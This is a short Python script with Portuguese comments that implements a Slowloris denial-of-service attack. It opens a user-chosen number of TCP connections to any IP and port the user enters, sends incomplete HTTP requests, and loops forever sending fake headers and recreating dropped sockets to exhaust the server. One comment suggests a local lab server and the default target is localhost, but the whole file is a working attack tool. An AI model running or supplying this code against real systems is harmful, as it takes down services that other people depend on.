# implementação simples do ataque slowloris

import socket
import time
import random

# headers de usuario e linguagem, pois em servidores reais a requisição nem passa se não tiver isso
# apesar de que no nosso servidor não tenha essa verificação
HEADERS = [
    b"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
    b"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
]
lista_sockets = []


def init_socket(host_alvo, porta_alvo):
    #cria socket TCP IPv4 na rede local, com timeout de 10 segundos
    socket_atck = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    socket_atck.settimeout(10)

    # conecta o socket ao host que vai ser atacado
    endereco_conexao = (host_alvo, porta_alvo)
    socket_atck.connect(endereco_conexao)

    # aqui coloca o pacote inicial 
    if socket_atck:
        try:
            string = f"GET /?{random.randint(0, 3000)} HTTP/1.1\r\n"
            socket_atck.send(string.encode("utf-8"))
            for header in HEADERS:
                socket_atck.send(header)
        except OSError:
            socket_atck.close()
            socket_atck = None

    return socket_atck

def enviar_header(socket_atck):
    if socket_atck:
        try:
            string = f"X-a: {random.randint(1, 5000)}\r\n"
            socket_atck.send(string.encode("utf-8"))
        except OSError as err:
            print(f"erro de socket: {err} matando socket")
            socket_atck.close()
            lista_sockets.remove(socket_atck)


# implementação slowloris
def ataque_slowloris(numero_sockets, host_alvo, porta_alvo):    # usar 200 sockets como numero padrão de quantidade
    # criação dos sockets de ataque
    for _ in range(numero_sockets):
        socket_atck = init_socket(host_alvo, porta_alvo)

        if socket_atck:
            lista_sockets.append(socket_atck)
            print(f"socket {len(lista_sockets)} criado")

    # ataque continuo slowloris, usando headers falsos para manter conexão viva
    while True:
        for socket_atck in lista_sockets:
            enviar_header(socket_atck)

        # recria sockets se a quantidade baixar por algum motivo
        for _ in range(numero_sockets - len(lista_sockets)):
            socket_atck = init_socket(host_alvo, porta_alvo)

            if socket_atck:
                lista_sockets.append(socket_atck)
                print("recriando socket")

        time.sleep(5)


if __name__ == "__main__":
    print("Opções do ataque slowloris (CTRL + C para parar o ataque):")

    host_padrao = "127.0.0.1" # localhost
    host_alvo = input(f"IP do host alvo(Padrão é localhost {host_padrao}): ")
    host_alvo = str(host_alvo) if host_alvo.strip() != "" else host_padrao

    porta_padrao = 3000
    porta_alvo = input(f"Porta alvo(Padrão é {porta_padrao}): ")
    porta_alvo = int(porta_alvo) if porta_alvo.strip() != "" else porta_padrao

    sockets_padrao = 150
    num_sockets = input(f"Numero de sockets para o ataque(Padrão é {sockets_padrao}): ")
    num_sockets = int(num_sockets) if num_sockets.strip() != "" else sockets_padrao

    ataque_slowloris(num_sockets, host_alvo, porta_alvo)